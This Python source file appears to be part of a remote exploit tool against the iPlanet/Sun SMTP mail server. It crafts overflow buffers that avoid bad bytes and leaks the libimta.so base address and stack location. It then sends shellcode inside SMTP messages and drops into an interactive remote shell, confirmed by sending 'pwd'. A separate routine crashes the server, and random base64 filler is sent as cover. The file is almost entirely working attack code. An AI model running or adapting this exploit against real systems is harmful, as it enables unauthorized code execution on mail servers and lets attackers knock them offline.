import time
import smtpUtils
import systems
import utils

class iplanet:
   badBytes = [0x0, 0xa, 0xd]
   nAttempts = 1

   def buildBaseBuffer(self, imtaBase):
      filler = utils.buildBuffer(self.baseBufLen, self.badBytes)
      baseBuf = filler[0x0:]
      return baseBuf

   def buildBounceBuffer(self):
      imtaBase = self.imtaBase
      baseBuf = self.buildBaseBuffer(imtaBase)
      l7 = (imtaBase + self.l7Imta) + self.l7Offset
      fp = imtaBase + self.fp
      filler = utils.buildBuffer(0x18, self.badBytes)
      bounceBuf = baseBuf \
                  + utils.stringifyAddr(l7) \
                  + filler \
                  + utils.stringifyAddr(fp) \
                  + utils.stringifyAddr(self.pc - 8)
      return bounceBuf

   def buildCoverupBuffer(self):
      return utils.randomBase64(self.bigBufLen, 64)

   def buildCrashBuffer(self):
      return utils.buildBuffer(self.crashBufLen, self.badBytes)

   def buildImtaLeakBuffers(self, imtaBase):
      baseBuf = self.buildBaseBuffer(imtaBase)
      l7 = (imtaBase + self.l7Imta) + self.l7Offset
      filler = utils.buildBuffer(4, self.badBytes)
      leakBuf = baseBuf \
                + utils.stringifyAddr(l7) \
                + filler		# filler is necessary in case we
					# get 0x20 as the last byte in l7
      response = imtaBase + self.l7ImtaResponse
      matchBuf = utils.stringifyAddr(response) \
                 + utils.stringifyAddr(0) \
                 + "01234\r\n"
      return leakBuf, matchBuf

   def crash(self):
      self.startNewMsg()
      sd = self.sd
      smtpUtils.sendMsg(sd, self.buildCrashBuffer(), self.buildCoverupBuffer())
      try:
         smtpUtils.recvReply(sd)
      except smtpUtils.smtpServerCrashed, err:
         print "Successfully crashed the target."
         self.conn = 0
         return 0
      except smtpUtils.smtpServerDisconnected, err:
         return 1
      else:
         smtpUtils.quit()
         return 1
      return 1

   # exploit will fail if we are not talking to the first answering thread.
   # unfortunately, there's no way to tell if this is the case remotely.
   def exploit(self):
      try:
         attempt = self.attempt
      except AttributeError:
         attempt = self.attempt = 1
      nAttempts = self.nAttempts
      shellcodeBuf = self.os.buildShellcodeBuffer(self)
      bounceBuf = self.buildBounceBuffer()
      self.startNewMsg()
      sd = self.sd
      if ((attempt == self.nAttempts) and (1 == attempt)):
         print "\nSending exploit:"
      elif (attempt <= self.nAttempts):
         print "\nSending exploit (attempt %d of %d):" % (attempt, nAttempts)
      else:
         return 1
      smtpUtils.sendMsg(sd, bounceBuf, shellcodeBuf)
      time.sleep(1)
      sd.send('pwd\n')
      try:
         reply = smtpUtils.recvReply(sd)
      except smtpUtils.smtpServerCrashed, err:
         print "FAILURE!"
         print "Target crashed -- probably because we were not talking to " \
               "the correct thread."
         self.attempt += 1
         return self.exploit()
      except smtpUtils.smtpError, err:
         err.printMsg("")
         return 1
      print "SUCCESS!"
      print "pwd: %s" % reply.strip()
      utils.interact(sd)
      sd.close()
      return 0

   def imtaTouch(self, bruteForce=False):
      print "\nLooking for libimta.so:"
      if (None == self.imtaBase):
         imtaBase = 0xfe800000L
      else:
         imtaBase = self.imtaBase
      try:
         leakBuf, matchBuf = self.buildImtaLeakBuffers(imtaBase)
      except IndexError, err:
         print "out of addrs"
         #self.crash()
         #connect
         #ehlo
         #self.conn = 0
         #leakBuf, matchBuf = self.buildImtaLeakBuffers(imtaBase)
      self.startNewMsg()
      sd = self.sd
      smtpUtils.sendMsg(sd, leakBuf)
      try:
         reply = smtpUtils.recvReply(sd)
      except smtpUtils.smtpError, err:
         err.printMsg("")
         return 1
      if (matchBuf != reply):
         print "Target replied with:"
         utils.dumpHex(reply)
         print "Expected:"
         utils.dumpHex(matchBuf)
         sd.close()
         return 1
      print "Found libimta.so at 0x%08x." % imtaBase
      self.imtaBase = imtaBase
      return 0

   def startNewMsg(self):
      sd = self.sd
      sender = self.sender
      recipient = self.recipient
      try:
         smtpUtils.startNewMsg(sd, sender, recipient)
      except:
         sd = self.sd = smtpUtils.connect(self.host, self.port)
         smtpUtils.ehlo(sd)
         smtpUtils.startNewMsg(sd, sender, recipient)

   def touch(self):
      retVal = 0
      # do the libimta leak if necessary
      try:
         imtaBase = self.imtaBase
      except AttributeError:
         imtaBase = self.imtaBase = None
      if (None == imtaBase):
         retVal = self.imtaTouch(self)
         if (1 == retVal):
            return retVal

      # do the stack location leak if necessary
      try:
         stackBase = self.stackBase
      except AttributeError:
         stackBase = self.stackBase = None
      if (None == stackBase):
         try:
            os = self.os
         except AttributeError:
            os = self.os = None
         if (None == os):
            retVal = systems.stackTouch(self)
         else:
            retVal = os.stackTouch(self)
      # do the OS identification leak if necessary
      else:
         try:
            os = self.os
         except AttributeError:
            os = self.os = None
         if (None == os):
            retVal = systems.stackTouch(self, stackBase)
      return retVal

class type1(iplanet):
   crashBufLen = 0x108
   bigBufLen = 0x1000
   def buildBaseBuffer(self, imtaBase):
      filler = utils.buildBuffer(self.baseBufLen, self.badBytes)
      conn = self.conn
      found = False
      while ((not found) and (conn < len(self.addrs))):
         addr = imtaBase + self.addrs[conn]
         conn += 1
         if (not utils.intHasBadBytes(addr, self.badBytes)):
            found = True
      self.conn = conn
      if (not found):
         raise IndexError()
      baseBuf = filler[0x0:0x104] \
                + utils.stringifyAddr(addr) \
                + filler[0x108:0x120] \
                + utils.stringifyAddr(addr) \
                + utils.stringifyAddr(addr) \
                + utils.stringifyAddr(addr) \
                + filler[0x12c:0x134] \
                + utils.stringifyAddr(addr) \
                + utils.stringifyAddr(addr) \
                + filler[0x13c:0x174] \
                + utils.stringifyAddr(addr) \
                + filler[0x178:]
      return baseBuf

class type2(iplanet):
   crashBufLen = 0x108
   bigBufLen = 0x1000
   def buildBaseBuffer(self, imtaBase):
      filler = utils.buildBuffer(self.baseBufLen, self.badBytes)
      conn = self.conn
      found = False
      while ((not found) and (conn < len(self.addrs))):
         addr = imtaBase + self.addrs[conn]
         conn += 1
         if (not utils.intHasBadBytes(addr, self.badBytes)):
            found = True
      self.conn = conn
      if (not found):
         raise IndexError()
      baseBuf = filler[0x0:0x104] \
                + utils.stringifyAddr(addr) \
                + filler[0x108:0x120] \
                + utils.stringifyAddr(addr) \
                + utils.stringifyAddr(addr) \
                + utils.stringifyAddr(addr) \
                + filler[0x12c:0x134] \
                + utils.stringifyAddr(addr) \
                + utils.stringifyAddr(addr) \
                + utils.stringifyAddr(addr) \
                + filler[0x140:0x178] \
                + utils.stringifyAddr(addr) \
                + filler[0x17c:]
      return baseBuf

class type3(iplanet):
   crashBufLen = 0x108
   bigBufLen = 0x1000
   def buildBaseBuffer(self, imtaBase):
      filler = utils.buildBuffer(self.baseBufLen, self.badBytes)
      conn = self.conn
      found = False
      while ((not found) and (conn < len(self.addrs))):
         addr = imtaBase + self.addrs[conn]
         conn += 1
         if (not utils.intHasBadBytes(addr, self.badBytes)):
            found = True
      self.conn = conn
      if (not found):
         raise IndexError()
      baseBuf = filler[0x0:0x104] \
                + utils.stringifyAddr(addr) \
                + filler[0x108:0x120] \
                + utils.stringifyAddr(addr) \
                + utils.stringifyAddr(addr) \
                + utils.stringifyAddr(addr) \
                + filler[0x12c:0x134] \
                + utils.stringifyAddr(addr) \
                + utils.stringifyAddr(addr) \
                + utils.stringifyAddr(addr) \
                + filler[0x140:0x17c] \
                + utils.stringifyAddr(addr) \
                + filler[0x180:]
      return baseBuf
